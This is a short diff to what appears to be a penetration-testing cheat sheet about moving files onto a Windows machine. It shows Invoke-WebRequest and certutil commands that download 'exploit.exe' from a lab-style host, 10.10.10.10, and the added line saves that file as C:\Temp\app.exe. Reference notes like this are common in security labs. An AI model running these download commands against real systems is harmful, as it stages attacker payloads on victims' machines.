@@ -24,6 +24,7 @@ Invoke-WebRequest "http://10.10.10.10/exploit.exe" -OutFile "C:\Windows\Temp\app
 # Certutil
 - Client:
 certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe
+certutil.exe -urlcache -split -f http://10.10.10.10/exploit.exe C:\Temp\app.exe
 
 # Python
 - Client:
